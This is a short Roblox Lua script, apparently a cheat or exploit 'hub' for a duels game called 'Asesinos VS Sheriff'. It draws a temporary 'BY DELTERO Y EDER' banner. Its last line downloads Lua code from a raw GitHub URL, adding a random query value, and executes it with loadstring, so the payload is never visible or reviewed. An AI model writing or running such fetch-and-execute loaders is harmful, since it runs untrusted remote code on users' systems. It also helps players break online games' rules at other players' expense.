-- [DUELS] Asesinos VS Sheriff - BY DELTERO Y EDER 👹 - V11.1
local Player = game.Players.LocalPlayer
local PG = Player.PlayerGui
for _,v in pairs(PG:GetChildren()) do if v.Name:find("Deltero") then v:Destroy() end end

local Gui = Instance.new("ScreenGui", PG)
Gui.Name = "DelteroEderHub"
Gui.ResetOnSpawn = false

local Text = Instance.new("TextLabel", Gui)
Text.Size = UDim2.new(0,400,0,80)
Text.Position = UDim2.new(0.5,-200,0.1,0)
Text.Text = "BY DELTERO Y EDER 👹🔥"
Text.TextScaled = true
Text.Font = Enum.Font.GothamBlack
Text.BackgroundColor3 = Color3.fromRGB(0,0,0)
Text.TextColor3 = Color3.fromRGB(255,0,0)
Instance.new("UICorner", Text).CornerRadius = UDim.new(0,12)
local S = Instance.new("UIStroke", Text)
S.Color = Color3.fromRGB(140,0,255)
S.Thickness = 3

game.Debris:AddItem(Text, 6)

-- AQUI VA TODO EL SCRIPT QUE TE MANDE ANTES
loadstring(game:HttpGet("https://raw.githubusercontent.com/robenosma-pixel/Isaias/main/isaias.lua?"..math.random(1,999999)))()
